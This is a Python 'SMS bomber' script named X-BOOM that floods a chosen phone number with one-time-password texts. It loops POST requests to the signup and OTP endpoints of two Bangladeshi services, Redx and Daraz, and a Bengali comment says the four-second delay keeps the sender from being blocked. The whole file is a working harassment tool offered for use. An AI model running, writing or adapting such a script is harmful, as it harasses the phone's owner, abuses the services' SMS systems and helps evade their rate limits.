import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        WELCOME TO X-BOOM TOOL          ")
    print("     Created by: mmalekislam788         ")
    print("     Status: MULTI-API ACTIVE (2026)    ")
    print("========================================")

def send_sms(target, count):
    # API 1: Redx
    url1 = "https://api.redx.com.bd/v1/user/signup"
    # API 2: Daraz
    url2 = "https://member-gateway.daraz.com.bd/membership/gw/otp/send"
    
    # Cleaning the number
    if target.startswith("01"):
        phone_with_88 = "88" + target
    else:
        phone_with_88 = target

    print(f"\n[+] Attack started on: {target}")
    for i in range(count):
        try:
            # API 1 attempt
            requests.post(url1, json={"phone": target})
            # API 2 attempt
            requests.post(url2, json={"phoneNumber": target, "otpType": "LOGIN"})
            
            print(f"[!] SMS {i+1} sent successfully!")
        except:
            print(f"[-] Error at SMS {i+1}")
        
        time.sleep(4) # ৪ সেকেন্ড গ্যাপ দিলে ব্লক হওয়ার ভয় থাকে না

def main():
    banner()
    print("\n[1] Start Power Bomber")
    print("[2] Exit")
    choice = input("\nSelect an option: ")
    if choice == '1':
        number = input("Enter Phone Number (01xxxxxxxxx): ")
        amount = int(input("Enter SMS Amount: "))
        send_sms(number, amount)
        print("\n[+] Task Completed!")
    else:
        print("Exiting...")

if __name__ == "__main__":
    main()

